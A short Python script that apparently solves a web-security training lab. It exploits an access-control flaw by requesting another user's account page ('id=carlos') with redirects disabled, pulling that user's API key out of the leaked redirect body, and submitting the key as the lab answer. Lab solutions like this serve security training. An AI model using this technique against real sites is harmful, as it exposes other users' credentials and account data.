import requests
import sys
import re


def get_api_key(url):
    print("(+) Getting Carlos's API Key...")
    carlos_account = url + "/my-account?id=carlos"
    response = requests.get(carlos_account, allow_redirects=False)
    content = response.text
    key = (re.search ("Your API Key is:(.*)", content).group(1)).strip()
    api_key = key.split('</div>')[0]
    print('(+) The API Key is: ' + api_key)
    
    submit_key(url, api_key)


def submit_key(url, key):
    print("(+) Submitting the key...")
    data={"answer": key}
    solution_url = url + "/submitSolution"
    response = requests.post(solution_url, data=data)
    content = response.text
    if "true" in content:
        print("(+) Successfully completed the lab.")
    
    else:
        print("(-) Something went wrong.")
        print("(-) Exiting...")
        sys.exit(1)


    
def main():
    if len(sys.argv) != 2:
        print(f"(+) Usage: python3 {sys.argv[0]} website")
        print(f"(+) Example: python3 {sys.argv[0]} www.example.com")
        sys.exit(1)
    
    print("(+) Starting the script...")
    url = sys.argv[1]
    get_api_key(url)

if __name__ == "__main__":
    main()